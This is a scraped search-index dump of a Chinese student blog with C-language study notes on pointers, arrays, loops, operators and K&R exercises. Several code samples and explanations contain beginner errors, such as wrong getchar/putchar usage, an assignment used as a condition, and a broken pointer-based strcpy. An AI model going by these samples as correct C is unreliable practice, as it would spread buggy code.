values[0];vp&lt;values[5];){ *vp++ = 0;} 指针做减法： 两个指针相减的结果类型是ptrdiff_t，它是一种有符号的证书类型。 减法运算的值是两个指针在内存中的距离（以数组元素的长度为单位），因为减法运算的结果是将除以数组运算类型的长度 指针都是4字节 关系运算对指针执行关系运算也是有限制 &lt; &lt;= &gt; &gt;= 不过前提是他们都是指向同一数组的元素 1234567891011121314{ float values[5]; float *p; for (p = &amp;values[5]; p &gt; &amp;values[0];) { *--p = 0; } for (int i = 0; i &lt; 5; i++) { printf(&quot;%f\\r\\n&quot;, values[i]); }} 错误的例子 1234567891011121314151617int main(){ float values[5]; float *p; for (p = &amp;values[5 - 1]; p &gt;= &amp;values[0];p--) { p = 0; } for (int i = 0; i &lt; 5; i++) { printf(&quot;%f\\r\\n&quot;, values[i]); }} 上面的例子错误的原因是，vp &gt;= &amp;values[0]的值是未定义的，因为vp移动到了数组的边界之外，所以就死循环了。 总结计算机内存中的每个地址都有一个地址标识 通常临近的内存组成一组，这样就允许内存存储更大的值 指针之间做运算的时候需要进行类型的强制转换 声明一个指针变量并不会和声明一个变量一样会自动分配内存 NULL指针就是不指向任何变量或者内存的指针 声明一个指针最好对他进行初始化 指针也可以进行加减法运算 如果两个指针指向同一块内存空间，那么有一个指针对这块内存进行修改，这块内存就会修改 警告不可以对未初始化的指针进行解引用 向函数传递null指针","link":"/2019/08/22/c%E4%B8%8E%E6%8C%87%E9%92%88-%E7%AC%AC%E4%B8%83%E7%AB%A0/"},{"title":"c与指针-第八章","text":"数组、指针效率、数组和指针、作为函数参数的数组名、声明数组参数、初始化、不完整的初始化、自动计算数组长度、字符数组初始化、二维数组、数组名、下标、指向数组的指针、作为函数参数的多维数组、总结 数组一维数组123int a;int b[10]; 有时候我们需要多个相同类型的值，但是使用第一种定义方式过于繁琐，所以我们引入了数组的概念，数组就是多个相同类型的元素的合集。 但是这个时候b代表什么？b代表的是整个数组名，并且b是数组下标的第一个元素 数组名并不用指针常量来表示—-数组名做sizeof操作符或弹幕操作符&amp;的操作数时 1234567int a[10];int b[10];int *c;c = &amp;b[0];c = b;a = c; //错误写法 这个时候的c=b代表的就是c=b这个数组中第一个元素的值。 表达式&amp;b[0]是一个指向数组第一个元素的指针 如果理解了&amp;b[0]是代表首元素，那么数组名代表的也是首元素，那么第五行代码就很容易可以理解了。 那么第六行是神恶魔意思呢，c是一个指针变量，a是一个数组，把c赋值给a，这样的写法是错误的，a是一个常量，不可以被修改。 下标引用123456int a[10];int b[10];int *c;c = &amp;a[0];*(b+3); //这句的意思是：取b这个数据，下标3的内容 在使用下标的地方，也可以通过对等的指针表达式来代替 int array[10]; int *ap = array+2; array+2这个表达式代表的是array[0]+array[2] = array[2]; 如果需要指针操作数组的时候： *(ap+(0))这样就是操作了这个数组的第0个元素 *(array+2)和上面的表达式对等 ap+6,这个个表达式就是看当前的ap指向数组中的第几个元素，然后向后移几个元素 *ap+6，这个和上一个不一样的，这个有一个优先级的问题，这个表达式中会先找到间接引用，然后用间接引用的值和6相加 *(ap+6),括号的优先级大于一切，所以先计算括号内容，然后取内容 &amp;ap,对ap进行取地址 ap[-1],如果这个时候ap指向第三个元素，那么-1，就是指向第二个元素，array[1]; ap[9]，当前的ap指向的元素是2，但是这个数据只有10个，9+2等于11，访问越界了 2[array]，这个表达式拆解开的意思：*(array+2)，相当于下标加2 指针与下标下标绝不会比指针更有效率，但是指针有时候会比下标更有效率 123456789101112#include &lt;stdio.h&gt;int main(){ int array[10]; int i; for(i=0;i&lt;10;i++) { array[i] = 0; }} 123456789101112#include &lt;stdio.h&gt;int main(){ int array[10]; int i; int *p; for(p = array;p&lt;array+10;p++) { *p = 0; }} 上面简单的实现两种方法，把一个数组内的所有内容全部归为0 指针效率指针有时候比下标更有效率，前提是他们得被正确的使用。 数组和指针数组和指针并不是相等的 声明一个数组的时候，编译器会根据数组的大小以及类型为它开辟一块内存空间。 声明一个指针的时候，编译器只为指针本身保留内存空间，它并不为任何数据类型分配内存空间 作为函数参数的数组名如果把一个数组名做参数传递给函数，调用函数实际上传递的是一个指针，所以函数的形参实际上是个指针 讲字符串b中的内容拷贝到字符串a中，虽然c语言提供了很多库函数 123456789101112131415161718int strcpy_acpy(char *buf, char *str){ while ((*buf++ = *str++) != '\\0' ) { if (*buf == '\\0') { return 0; } }}int main(){ char a[10] = &quot;hello&quot;; char b[5] = &quot;world&quot;; strcpy_acpy(a, b); printf(&quot;%s&quot;, a);} 声明数组参数调用函数时实际传递的是一个指针，所以函数的形参是个指针 但是编译也接受数组形式的函数形参 int strlen_len(char *string); int strlen_len(char string[]); 其实他们两个传递的值是相等的 初始化 int array[10] = {1,2,3,4,5,6,7,8,9,10}; 这样就是初始化了一个数组，所以array的值就是10 写一个我学c语言的时候犯的错误 1234567int main(){ int array[10] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }; printf(&quot;%d\\r\\n&quot;, array); system(&quot;pause&quot;);} 这个代码最后打印的时候值并不是1，但是前面说了，数据名相当于第一个元素，但是这里打印出来的是一个数组，这里就有一个问题就是，如果以整形的方式的打印数组，就会出问题，格式化输出的形式是整形，但是我们的类型是一个数组。 不完整的初始化int array[10] = {1,2,3,4,5,6}; 如果我们这么些，也是初始化，只是没有将元素和个数对应上，对于这种赋值，编译器会帮我们把后面的参数都填充为0 只要对数据中的第一个值进行了初始化，后面的部分都会填充为0 自动计算数组长度int array[] = {1,2,3}; 这个时候，其实编译器就会帮我们填充这个数组有多大 比较直观的看出来，这个数组有几个元素 我们中间使用了一个比较投机的办法， sizeof(array) //求这个数组有多大，因为是int型数组，所以每个元素占4字节，然后再处以int 字符数组初始化字符是单引号，字符串是双引号 char array[] = {‘h’,’e’,’l’,’l’,’0’}; //字符数组 char array[] = {“hello”}; //字符串数组 简单的区别就是字符串需要使用%s格式化输出符号，字符使用%c 如果数组的维度不止一个，那么就称为多维数组 int max[6][10]; 存储顺序int array[3]; 可以看到数组在内存中是顺序存储的，那么二维数组是怎么存储的呢 可以看到，在内存中是4字节对齐的数据，每一个元素中都有自己的存储单元。 数组名一维数组名的值是一个指针常量，它的类型是“指向元素类型的指针”，它指向数组的第一个元素，多维数组也是一样的，唯一的区别是多维数组的第一维的元素实际上是另一个数组 int array[10]; 首元素是array[0] int artay[10][]; 首元素是array[0][0] array[3][10]; //它的含义是3个元素，每个元素内有10个整形元素 下标如果要精确的找到多维数组中的某个元素，那么必须按照数组声明时的顺序为每一维提供一个下标 int array[3][10]; 如果要在这个数组中找到某一个指定元素 array [1][5] 那么用指针的形式写法就是： ((array + 1)+5); array代表的是十个元素，加一以后，指向下一个十个元素，然后再加五 *(array[1]+5); array[1]代表的是一个子数组，所以访问的指针是指向一个整形的指针 指向数组的指针指向二维数组的指针和指向一维数组的指针其实大同小异 int array[100]; int *p = array; int array1[3][10]; int (*p1)[10] = array1; 上面的写法是正确的写法 p1是一个指针，指向具有10个整形元素的数组 记住p1的指向是0 如果要是理解不了可以这么写 int *pi = &amp;array1[0][0]; int *py = array[0]; 这两种写法都是使这个指针指向第一个整形元素 作为函数参数的多维数组void fun(int (*p)[10]); void fun(int p[][10]) 以上的两种写法都可以作为函数的参数进行传递 我们可以在声明的时候，不写第一维度，但是第二维度一定要写 初始化","link":"/2019/08/22/c%E4%B8%8E%E6%8C%87%E9%92%88-%E7%AC%AC%E5%85%AB%E7%AB%A0/"},{"title":"c语言第一章","text":"linux中打印Hello、变量与算法表达式、循环语句、符号常量、字符串输入输出、或且非、数组、多重条件判断 安装ubuntu操作系统，并且安装tools 12345#include &lt;stdio.h&gt; //标准的输入输出头文件int main() //不接受任何值传递的main函数{ //c语言的代码都需要写在大的花括号内 printf(&quot;Hello\\n&quot;); //调用printf将hello打印到屏幕上} 一个c语言的程序，无论大小，都是由函数和变量名组成的 main函数是一个特殊的函数名，每一个程序都是从main函数的起点开始工作，这也就是每一个c与语言的程序的入门，都是main函数。（如果对c语言了解的很清楚的人，这句话其实是错误的，真证明的启动入口为mainCRTStartup），老版本的vc6可见。 练习1-1 123456789101112131415#include &lt;stdio.h&gt;/*正常代码int main(){ printf(&quot;hello,world\\n&quot;); getchar();}*//*输出结果为，语法错误，缺少}*/int main(){ printf(&quot;hello world\\n); getchar();} 练习1-2 12345678#include &lt;stdio.h&gt;/*当printf输出包含\\c,\\c的内容为任何的时候*/int main(){ printf(&quot;hello wolrd\\q&quot;); getchar(); /*输出结果就是把q正常输出了*/} printf函数的一些功能，printf是一个通用的格式化函数 变量与算术表达式使用公式c=(5/9)(F-32)打印花式温度和摄氏度对照表 12345678910111213141516#include &lt;stdio.h&gt;int main(){ int fahr,celsius; int lower,upper,step; lower = 0; //温度的下线 upper = 300; //温度的上限 step = 20; //步长 fahr = lower; // while (fahr &lt;= upper) { celsius = 5 * (fahr-32) / 9; printf(&quot;%d\\t%d\\n&quot;,fahr,celsius); fahr = fahr + step; // }} 这个程序用到了c语言的基础类型，int类型，除了int，c语言还有其他的数据类型 char 字符型1个字节 short 短整型 long 长整形 double 双精度浮点数 float 单精度浮点数 int 整形 c语言的代码执行过程是自上而下的，比如说你把一个变量定义在了下方，但是你在上面使用，是无法使用这个变量，c语言的编译器也会很开心的告诉你，这个变量未定义。 上面的这段代码执行后会有一个比较大的问题，与0摄氏度对应的温度应该为-17.8度，但是输出的结果为17，因为我们使用了%d输出，%d输出的方式会将所有的浮点数全部按照整形来输出，所以我们需要对代码进行改善 1234567891011121314151617#include &lt;stdio.h&gt;int main(){ float fahr, celsius; float lower, upper, step; lower = 0; //温度的下线 upper = 300; //温度的上限 step = 20; //步长 fahr = lower; // while (fahr &lt;= upper) { celsius = (5.0 / 9.0)*(fahr - 32.0); printf(&quot;%3.0f\\t%f\\n&quot;, fahr, celsius); fahr = fahr + step; // } system(&quot;pause&quot;);} 因为输出的结果无法对齐，所以需要%3.0f这种打印方式，这种打印方式简单的来说，就是打印的时候让3.0去占屏幕的3个字符宽，然后使打印结果统一打印。 练习1-3 12345678910111213141516171819/*修改温度转换程序，使之能够在转换表顶部打印一个标题*/#include &lt;stdio.h&gt;int main(){ printf(&quot;\\t温度标题\\n&quot;); float fahr, celsius; float lower, upper, step; lower = 0; //温度的下线 upper = 300; //温度的上限 step = 20; //步长 fahr = lower; // while (fahr &lt;= upper) { celsius = (5.0 / 9.0)*(fahr - 32.0); printf(&quot;%3.0f\\t%f\\n&quot;, fahr, celsius); fahr = fahr + step; // } system(&quot;pause&quot;);} 练习1-4 12345678910111213141516171819/*摄氏度温度转换华氏温度*/#include &lt;stdio.h&gt;int main(){ printf(&quot;\\t温度标题\\n&quot;); float fahr, celsius; float lower, upper, step; lower = 0; //温度的下线 upper = 300; //温度的上限 step = 20; //步长 fahr = lower; // while (fahr &lt;= upper) { celsius = (5.0 / 9.0)*(fahr - 32.0); printf(&quot;%3.0f\\t%f\\n&quot;, celsius, fahr); fahr = fahr + step; // } system(&quot;pause&quot;);} 循环语句c语言中的循环有三种，一种while，一种do…while,一种for 介绍一下三种循环方式， while的循环，条件写在while后的括号中，条件成立，一直循环 do…while,不管条件成立不成立，都会执行代码 for循环，条件写多少，它就执行多少次 1234567891011#include &lt;stdio.h&gt;int main(){ int fahr; for(fahr = 0;fahr &lt;= 300; fahr = fahr + 20) { printf(&quot;%3d %6.1f\\n&quot;,(5.0/9.0)*(fahr-32)); } system(&quot;pause&quot;);} 练习1-5 12345678910111213/*修改温度转换程序，要求逆序排列*/#include &lt;stdio.h&gt;int main(){ int fahr; for (fahr = 300; fahr &gt;=0; fahr = fahr - 20) // { printf(&quot;%3d %6.1f\\n&quot;,fahr, (5.0 / 9.0)*(fahr - 32)); } system(&quot;pause&quot;);} 符号常量在程序中使用一些固定的数指，会给以后的代码带来一些不必要的麻烦，比如说日后需要修改某一处数指，需要修改的地址太多，所以我们使用define 练习1-6(自己给自己加的) 12345678910111213141516/*修改程序，使其支持可随意修改*/#include &lt;stdio.h&gt;#define LOWER 0#define UPPER 300#define STEP 20int main(){ int fahr; for (fahr = LOWER; fahr &lt;= UPPER; fahr = fahr + STEP) // { printf(&quot;%3d %6.1f\\n&quot;, fahr, (5.0 / 9.0)*(fahr - 32)); } system(&quot;pause&quot;);} 字符输入输出前面既然有了输出，那必然会有输出，比如说一个程序，我们需要他向用户提供结构，让用户来定义当前的温度，然后输出转换的过后的温度 123456789101112131415161718192021222324252627282930313233343536#include &lt;stdio.h&gt;/*简单例子int main(){ int c; //定义一个变量 c = getchar(); //接受一个字符的输入 putchar(c); //把这个字符输出到屏幕上 system(&quot;pause&quot;);}*//*读一个字符，然后判断是不是文件结尾，输出字符,读取下一个*//*int main(){ int c = NULL; while (c != EOF) //此处EOF为c语言文件操作中的文件结尾 { putchar(c); c = getchar(); } system(&quot;pause&quot;);}*//*对上面的程序进行优化 */int main(){ int c = NULL; while (getchar(c) != EOF) { putchar(c); } system(&quot;pause&quot;);} 练习1-6 12345678910/*验证表达式结果getchar*//*这个时候不管输入任何值，都是1*/#include &lt;stdio.h&gt;int main(){ int c = NULL; printf(&quot;%d&quot;, getchar() != EOF); system(&quot;pause&quot;);} 练习1-7 123456789/*编写一个打印EOF值得程序*//*参考答案写出来得，因为我理解得EOF就是文件得结尾*/#include &lt;stdio.h&gt;int main(){ printf(&quot;%d\\r\\n&quot;, EOF); system(&quot;pause&quot;);} 在c语言中，一个字符串得结尾是“\\0”来结尾得 练习1-8 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;/*思路想错了，以为需要ascll码表中得字符来做转换计数*//*int main(){ char c = NULL; int c1 = NULL; while (getchar(c) != EOF) { if (c == '13') //13代表ascll码表中得空格 { ++c1; } printf(&quot;一共有%d个空格&quot;, c1); break; } system(&quot;pause&quot;);}*/int main(){ int c = NULL; int c1 = NULL; int c2 = NULL; int c3 = NULL; while ((c = getchar()) != EOF) { if (c == ' ') { ++c1; } if (c == '\\t') { ++c2; } if (c == '\\n') { ++c3; } } printf(&quot;空格个数%d&quot;, c1); printf(&quot;制表符个数%d&quot;, c2); printf(&quot;换行符%d&quot;, c3);} 练习1-9 12345678910111213141516171819202122#include &lt;stdio.h&gt;/*题目没有说明输入得内容是字符串还是整形，按照整形做*/int main(){ int c = NULL; int lastc = NULL; while (getchar(c) != EOF) { if (c != ' ') { putchar(c); } if (c == ' ') { if (lastc != ' ') { putchar(c); } } }} 练习1-10 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;int main(){ int c = NULL; int i = NULL;; int g = NULL; while (getchar(c) != EOF) { if (c == '\\t') { printf(&quot;\\\\t&quot;); } if (c == &quot;\\b&quot;) { printf(&quot;\\\\&quot;); } if (c == '\\b') { if (c != '\\t') { putchar(c); } } } system(&quot;pause&quot;);} 单词计数，比如要统计，有多少个单词 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#define IN 1#define OUT 0int main(){ int c; int n1; int nw; int nc; int state; state = OUT; n1 = nw = nc = 0; //这条语句得意思是把这三个变量全部赋值为0 while ((c = getchar()) != EOF) { ++nc; if (c == '\\n') { ++n1; } if (c == ' ' || c == '\\n' || c == '\\t') //条件判断语句 { state = OUT; } else if (state = OUT) //符合条件判断语句 { state = IN; ++nw; } } printf(&quot;%d\\t%d\\t%d\\t\\n&quot;, n1, nw, nc); system(&quot;pause&quot;);} 或且非&amp;&amp;与 参与运算的两个表达式都为真时，结果才为真，否则为假。 || 或 参与运算的两个表达式只要有一个为真，结果就为真；两个表达式都为假时结果才为假 ！ 非 参与运算的表达式为真时，结果为假；参与运算的表达式为假时，结果为真 练习1-11 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#define IN 1#define OUT 0int main(){ int c; int n1; int nw; int nc; int state; state = OUT; n1 = nw = nc = 0; //这条语句得意思就是把这三个变量全部赋值为0 while ((c = getchar()) != EOF) { ++nc; if (c == '\\n') { ++n1; } if (c == ' ' || c == '\\n' || c == '\\t') //条件判断语句 { state = OUT; } else if (state = OUT) //符合条件判断语句 { state = IN; ++nw; } } printf(&quot;%d\\t%d\\t%d\\t\\n&quot;, n1, nw, nc); system(&quot;pause&quot;);} 练习1-12 1234567891011121314151617#include &lt;stdio.h&gt;/*编写一个程序，以每行一个单词打印输出*/int main(){ char c = NULL; while ((c = getchar()) != EOF) { if (c == '\\n') { putchar(c); printf(&quot;\\n&quot;); } } system(&quot;pause&quot;);} 数组数组就是同一种数据类型得集合，连续排列，数组下标可以是任何整形表达式。 多路判定在程序中经常使用这样得判定 if(条件1) { ​ 语句1 } else if(条件2) { ​ 语句2 } ….. 练习1-13 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){ int nc, ns, nw, i, m, n; /*定义字符个数，单词结束判断条件，单词个数，循环变量*/ int max; /*定义最长单词的字符数*/ int p[50]; /*定义单词长度数组*/ char a[50][50]; /*定义单词字符数组*/ char c; /*定义输入字符*/ max = 0; /*最长单词字符数初始为0*/ i = 1; /*单词长度数组下标初始值为1*/ ns = nc = nw = 0; /*单词判断初始条件，字符个数初始值，单词个数初始值都为0*/ m = n = 1; /*单词数组下标初始值为1*/ while ((c = getchar()) != EOF){ /*当输入字符不是文件结束符*/ if ((c &gt;= 'A'&amp;&amp;c &lt;= 'Z') || (c &gt;= 'a'&amp;&amp;c &lt;= 'z')){ /*当输入字符是字母时*/ ++nc; /*字符个数增加1个*/ a[m][n] = '*'; /*单词数组赋值为星号*/ ++n; /*本单词数组的二元下标增加1位*/ ns = 1; /*单词判断为单词内*/ } else if (ns == 1){ /*如果输入字符不是字母并且单词判断条件是在单词内*/ ++nw; /*单词个数增加1位*/ ++m; /*单词数组一元下标增加1位*/ p[i] = nc; /*字符个数赋值给单词长度数组*/ if (nc &gt;= max) /*如果字符个数大于目前单词长度最大值*/ max = nc; /*当前字符个数赋值给单词长度最大值*/ ++i; /*单词长度数组下标增加1位*/ n = 1; /*单词数组二元下标回到初始值*/ ns = nc = 0; /*单词判断条件和字符个数回到初始值*/ } } for (n = max; n &gt;= 1; --n){ /*以下循环体是打印单词的垂直直方图，如果单词数组没有赋值星号，则打印空格*/ for (m = 1; m &lt;= nw; ++m){ if (a[m][n] == '*'){ printf(&quot;%c &quot;, a[m][n]); } else printf(&quot; &quot;); } printf(&quot;\\n&quot;); } for (i = 1; i &lt;= nw; ++i) /*以下循环体是打印单词个数*/ printf(&quot;%d &quot;, p[i]); printf(&quot;\\n&quot;); system(&quot;pause&quot;); return 0;} 练习1-14 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#include &lt;stdio.h&gt;#define MAXHIST 15#define MAXWORD 11#define IN 1#define OUT 0int main(){ int c, i, j, nc, state; int len; int maxvalue; int ovflow; int wl[MAXWORD]; state = OUT; nc = 0; ovflow = 0; for (i = 0; i &lt; MAXWORD; ++i) wl[i] = 0; while ((c = getchar()) != EOF) { if (c == ' ' || c == '\\n' || c == '\\t') { state = OUT; if (nc &gt; 0) if (nc &lt; MAXWORD) ++wl[nc]; else ++ovflow; nc = 0; } else if (state == OUT) { state = IN; nc = 1; } else ++nc; } maxvalue = 0; for (i = 1; i &lt; MAXWORD; ++i) if (wl[i] &gt; maxvalue) maxvalue = wl[i];#if 0 for (i = 1; i &lt; MAXWORD; ++i) { printf(&quot;%5d - %5d :&quot;, i, wl[i]); if (wl[i] &gt; 0) { if ((len = wl[i] * MAXHIST / maxvalue) &lt;= 0) len = 1; } else len = 0; while (len &gt; 0) { putchar(&quot;*&quot;); --len; } putchar('\\n'); }#else for (i = MAXWORD; i &gt; 0; --i) { for (j = 1; j &lt; MAXWORD; ++j) if (wl[j] * MAXWORD / maxvalue &gt;= i) printf(&quot; * &quot;); else printf(&quot; &quot;); putchar('\\n'); } for (i = 1; i &lt; MAXWORD; ++i) printf(&quot;%4d &quot;, i); putchar('\\n'); for (i = 1; i &lt; MAXWORD; ++i) printf(&quot;%4d &quot;, wl[i]); putchar('\\n');#endif if (ovflow &gt; 0) printf(&quot;%d words &gt;= %d\\n&quot;, ovflow, MAXWORD); return 0;}","link":"/2019/05/13/c%E8%AF%AD%E8%A8%80%E7%AC%AC%E4%B8%80%E7%AB%A0/"},{"title":"C语言第三章","text":"语句块、if…else、else-if、switch、while循环与for循环、do-while、break和coutinue、goto 语句块在c语言中，分号是语句的结束符。 用一对花括号把一组声明括在一起就构成了一个复合语句，也叫程序快，复合语句在语法上等价于单条语句。 if…elseif-else语句用于条件判断，其中else部分是可选的，语句执行时，先计算表达式的值，如果表达式的值为真，则执行语句，如果表达式为假，并且语句包含else部分，则执行语句2 else-ifif(表达式) {语句} else if(表达式) {语句} else if(表达式) {语句} 这里注重说明一下，这种if语句序列是多路判定，有多个条件需要判断，一旦某个表达式为真，则执行相关语句 最后一个else用于上面的条件都不成立，执行最后一个语句 switchswitch语句也是一种多路判定语句，它测试一个值是否与某一个常量值匹配 switch(表达式) case 常量: case 常量 default:语句 while循环与for循环whilewhile (表达式) {语句} 首先求表达式的值，如果值非0，则执行语句，并再次求该表达式的值 forfor (表达式) {语句} for循环一般用于知道需要循环多少次的情况下 do-whiledo { 语句 }while (表达式) 这个语句的意思，无论条件成立不成立，都会执行一次语句 break和coutinuebreak是结束当前循环 coutinue是跳出当此循环，从上而下继续执行 gotoc语言提供了可随意滥用的goto语句以及标记跳转位置的符号","link":"/2019/05/15/c%E8%AF%AD%E8%A8%80%E7%AC%AC%E4%B8%89%E7%AB%A0/"},{"title":"c语言第二章","text":"变量名、数组类型及长度、常量、字符与字符串、声明、算术运算符、关系运算符与逻辑运算符、类型转换、自增自减、按位运算、赋值运算符、条件表达式 变量名可以使用字母、数组、下划线开头，但是不可以使用数组开头，并且不可以使用c语言关键字做变量名。 c语言变量名严格区分大小写 数据类型及长度char 字符型 一个字节 int 整形 四个字节 float 单精度浮点数 double 双精度浮点数 unsigned 无符号 常量整形除了用十进制便是外，还可以用八进制或者十六进制来表示它，带前缀0的常量一般表示把金子，带前缀0x的表示为十六进制。 一个字符常量是一个证书，书写时将一个字符括号在单引号中。 ascii码中c语言的全部转义字符 \\a 响铃 \\b 回退 \\f 换页 \\n 换行 \\r 回车 \\t 横向制表符 \\v 纵向制表符 \\ 反斜杠 ? 问号 ' 单引号 '‘ 双引号 \\ooo 八进制数 \\xhh 十六进制数 \\0 达标数值为0的字符 字符与字符串‘x’和“x”是不同的 前者代表一个整数，后者代表一个字符并且是一个以‘\\0’结尾的字符数组 声明例如： int i = 0; char c = ‘\\‘; float f = 3.14f; 任何变量都可以使用const限定符进行修饰，限定该值不可以被改变。 例如： const int i = 0; 算术运算符二元运算符主要包括：加(+)、减(-)、乘(*)、除(/)、取余(%) 最经典的例子，判断是不是闰年 123456789101112131415#include &lt;stdio.h&gt;int main(){ int c = 0; scanf(&quot;%d&quot;, &amp;c); if ((c % 4 == 0 &amp;&amp; c % 100 !=0) || c % 400 == 0) { printf(&quot;是闰年&quot;); } else { printf(&quot;不是闰年&quot;); } system(&quot;pause&quot;);} 注意：取余运算符不能用域float和doubule运算 关系运算符与逻辑运算符关系运算符包括： &gt; &gt;= &lt; &lt;= (大于 大于等于 小于 小于等于) 优先级相同，优先级次于相等运算符 相等运算符: == != (等于 不等于) 类型转换当一个运算符与几个操作数类型不同的时候，就需要通过一些规则来转换它。 在做类型的强制转换的时候，最好定义它是否是无符号数 当把较长的整形转换为char的时候，超出的高位部分被丢弃 将字符型转为整形的时候，c语言并没有定义char类型是的变量是无符号还是有符号 当把char类型强制转换为整形的时候，很有可能会结果为负数 自增运算符和自减运算符++自增 –自减 还分为前++和后++，–同理 按位运算符c语言提供了6个位操作运算符，这些运算符只能用于整形操作数 &amp; 按位与| 按位或^ 按位异或~ 取反 ‘&gt;&gt;’右移操作符（记得去引号） &lt;&lt;左移操作符 &amp;： 12340&amp;0=0; 0&amp;1=0; 1&amp;0=0; 1&amp;1=1; |: 12340|0=0; 0|1=1; 1|0=1; 1|1=1; ^: 12340^0=0; 0^1=1; 1^0=1; 1^1=0; ~: 12~1=0; ~0=1; &lt;&lt;: 1二进制左移运算符。将一个运算对象的各二进制位全部左移若干位（左边的二进制位丢弃，右边补0）。 ‘&gt;&gt;’: 1二进制右移运算符。将一个数的各二进制位全部右移若干位，正数左补0，负数左补1，右边丢弃。 赋值运算符与表达式在赋值表达式中，如果表达式左边的变量重复出现在表达式的邮编 i = i + 1; 则可以缩写为： i += 1; 条件表达式三目运算符： a&gt;b ? a:b; 这个语句的意思就是 12345678if(a&gt;b){ return a;}if(a&lt;b){ return b;}","link":"/2019/05/17/c%E8%AF%AD%E8%A8%80%E7%AC%AC%E4%BA%8C%E7%AB%A0/"},{"title":"c语言第五章","text":"指针与数组、地址算术运算、字符指针和函数、指针数据以及指向指针的指针、多维数组、指针数组的初始化、命令行参数 指针与数组指针是一种保存变量地址的变量。 指针与地址同样的机器都有一系列连续标号或者编址的存储单元和谐存储单元可以单个进行操纵，也可以以连续程序的方式操作。 通常情况下，机器的一个字节可以存放一个char类型的数据，两个相邻的字节存储单元可以存储一个short（短整形，放在内存中是字）类型的数据。而4个相邻的字节存储单元可以存储一个long（长整形）类型的数据。指针是可以存放一个地址的一组存储单元（通常是两个字，四个字节）, 1234int c = 10;int *p = NULL; //定义的指针的最好初始化一下p = &amp;c; 这个时候的p等于多少呢？ p = 10; 取地址运算符&amp;只能用于内存中的对象，即变量与数组元素，不能用于表达式、常量或者register类型的变量 register是将变量放入cpu内部寄存器 一元运算符*是间接寻址引用运算符，当它作用于指针时，将访问指针锁指向的对象。 123456789int x = 1;int y = 2;int z[10]; //数组也可以不初始化，但是必须写明数组有多少元素int *ip; //定义了一个指针ip = &amp;x;y = *ip;*ip = 0;ip = &amp;z[0]; 指针只可以指向某种特定的数据类型 void指针也称为无类型指针，可以存放指向任意类型的指针，但是它不能简介引用其自身 *和++这样的一元运算符遵循从左往右的结合顺序 由于指针也是变量，所以再程序中可以直接引用，而不需要通过简介引用的方法。 指针与函数参数由于c语言是以船只的方式将参数值传递给被调用函数，因此被调函数不可以直接修改主调函数的值， 123456789101112131415161718void swap(int a, int b){ int c; c = a; a = b; b = c; printf(&quot;%d\\r\\n&quot;, a); printf(&quot;%d\\r\\n&quot;, b);}int main(){ int i = 10; int j = 20; swap(i, j); system(&quot;pause&quot;);} 上面的代码就实现了将传递的参数进行调换，但是书上给我们说的是需要修改主调函数中的值，我们再去main函数中打印两个变量的值，这个时候发现，他们两个并没有什么变化。 这个时候我们就可以用指针来实现 12345678910111213141516171819void swap(int *a, int *b){ int temp; temp = *a; *a = *b; *b = temp; }int main(){ int i = 10; int j = 20; swap(&amp;i, &amp;j); //指针传递的时候，变量名前面需要加取地址符号 printf(&quot;%d\\r\\n&quot;, i); printf(&quot;%d\\r\\n&quot;, j); system(&quot;pause&quot;);} 循环调用getint函数给一个整形数组赋值 解释一下getint函数的作用，getint将输入的字符流分解成证书，且每次调用得到一个整数，getint需要返回将转换后得到的数，并且，再到达输入结尾时要返回文件结束标记。 isspace函数的作用，isspace判断输入字符是否为空格、回车、制表符等 getch()是从缓冲区中无回显地读字符 ungetch()是把一个字符退回到键盘缓冲区中 习题5-1、5-2非独立完成 指针与数组声明一个数组 int a[10]; //声明一个数字，里面存放的10个整形数据 声明一个指针 int *p; //声明一个整形的指针 赋值 p = &amp;a[0]; //数组名就是数组的第一个元素 赋值 int x; x = p; //指针中，加‘’代表取内容 数组名代表的就是该数组最开始的第一个元素 指针是一个变量 1234567891011121314151617181920212223242526int strlen(char *s){ int n; for (n = 0; *s != '\\0'; s++) //s++代表指向字符串的下一个 { n++; //n是计数器，满足条件，n就+一次 } return n;}int main(){ int i; int j; int o; char s[100] = &quot;hello,wolrd&quot;; char *c = &quot;学c真难&quot;; i = strlen(&quot;你好，世界&quot;); j = strlen(s); o = strlen(c); printf(&quot;%d\\r\\n&quot;, i); printf(&quot;%d\\r\\n&quot;, j); printf(&quot;%d\\r\\n&quot;, o); system(&quot;pause&quot;); return 0;} 在函数的定义中： 123char c[100] = &quot;xxxx&quot;;char *c = &quot;xxxx&quot;; 他们的定义出来的功能是不一样的。 地址算术运算实现一个strlen 1234567891011121314151617181920212223int strlen_len(char *s){ char *p = s; int i = 0; //检查计数器 while (*p != '\\0') { i++; p++; //代表下一个位置 } return i;}int main(){ int i; i = strlen_len(&quot;hello&quot;); printf(&quot;%d\\r\\n&quot;, i); system(&quot;pause&quot;); return 0;} 书上写的意思是，首先先用一个*p指向这个字符数组，然后使用while循环进行检查（“\\0是字符串的结尾”）,最后返回的时候，因为本来指针变量p指向s这个字符数组的时候，它的自身已经是5了，所以返回的时候需要减去这个5 上面程序使用了一个c语言里经常使用的malloc和free，通过检查内存的方式来帮助增强记忆 如果要做任何指针的之间的运算，必须是同类型之间的，如果不同类型，可以进行类型的强制转换 字符指针和函数字符串常量是一个字符数组 12printf(&quot;Hello Wolrd&quot;); 查看一下他的函数实现 可以看到，他最后也是通过一个char指针访问字符串的。 123char amessage[] = &quot;nw is the time&quot;;char *pmessage = &quot;now is teh time&quot;; 上面的这两个定义有很大的区别的，amessage是仅仅声明了一个初始化字符串以及空字符’\\0’的一维数组，数组中的每个字符可以单独修改，但是amessage始终指向同一个存储位置。 但是pmessage是一个指针，指向一个字符串常量，之后它可以指向任意位置。 strcpystrcpy(x,t)，把指针t指向的字符串复制到指针s指向的位置。实际上实现的是指针的拷贝，而并没有复制字符串。 数组的方法实现strcpy 123456789void strcpy(char *s,char *t){ int i = 0; while((s[i] = t[i]) != '\\0') { i++; //下标加1 } } 指针的方法实现strcpy 123456789void strcpy(char *s,char *t){ int i = 0; while((*s[i] = *t[i]) != '\\0') { i++; } } 